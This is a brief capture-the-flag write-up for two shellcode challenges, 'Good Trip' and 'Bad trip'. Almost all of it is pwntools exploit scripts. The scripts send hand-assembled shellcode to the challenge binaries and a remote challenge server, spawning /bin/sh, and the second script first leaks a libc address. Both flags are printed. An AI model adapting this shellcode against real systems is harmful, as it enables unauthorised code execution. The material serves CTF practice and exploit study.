# Good Trip

A simple shellcode challenge

```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./good_trip')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./good_trip', gdbscript=gs)
    if args.REMOTE:
        return remote('172.210.129.230', 1351)
    else:
        return process('./good_trip')
r = start()
#========= exploit here ===================

payload = b"\x90"*0x7
payload += b"\x90" #b"\xcc"
payload += asm('''

    mov rsp, 0x404200
    mov rbp, 0x404200
    mov r11, 0x401090
    mov rsi, 0x100
    mov rdx, 0x7 
    call r11
    mov r10, 0x0068732f6e69622f
    mov [0x404100], r10
    mov rdi, 0x404100
    xor rsi, rsi
    xor rdx, rdx
    mov r9, 0x0000000000000959f
    mov r10, 0x1337131000
    xor [r10], r9
    mov rax, 0x3b
    mov rsp, 0x1337131000
    jmp rsp 
    ''')

payload += b"\xcc"*0x100
size = str(len(payload)).encode('ascii')
r.sendlineafter(b"code size >>", size)
r.sendlineafter(b"code >>", payload)

#======== interactive ====================
r.interactive()
#AKASEC{y34h_You_C4N7_PRO73C7_5om37hIn9_YoU_doN7_h4V3}
```

# Bad trip

A variation of the previous challenge, the difference was that we needed to leak a libc address to get a shell, at least that was how I solved it. The ARCH libc part was alittle bit confusing.

```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./bad_trip')
context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'debug'

def start():
    if args.GDB:
        return gdb.debug('./bad_trip', gdbscript=gs)
    if args.REMOTE:
        return remote('172.210.129.230', 1352)
    else:
        return process('./bad_trip')
r = start()

def format_byte_string(byte_string):
    result = 'b"' + ''.join(f'\\x{b:02x}' for b in byte_string) + '"'
    print(result)

#========= exploit here ===================

r.recvuntil(b"with ")
leak = int(r.recvline().strip(),16)
log.info(f"leak {hex(leak)}")
payload = b"\x90"*0x7
payload += b"\x90"

#execve() - puts()
#0x617e0 #0x6a220 #0x60e00
payload += asm(f'''
    mov rsp, 0x6969696000
    mov rbp, 0x6969696000
    mov r11, 0x0068732f6e69622f
    mov rdi, 0x6969696500
    mov [rdi], r11
    xor rsi, rsi
    xor rdx, rdx
    mov r10, fs:0x0
    mov eax, {hex(leak+0x60e00)}
    mov r11, 0xFFFFFFFF00000000
    and r10, r11
    or r10, rax
    mov [rsp], r10
    ret
''')

payload += b"\x90"*0x20

format_byte_string(payload)

r.sendlineafter(b">>", payload)
r.timeout = 1

#========= interactive ====================
r.interactive()
#AKASEC{pr3f37CH3M_Li8C_4Ddr35532}
```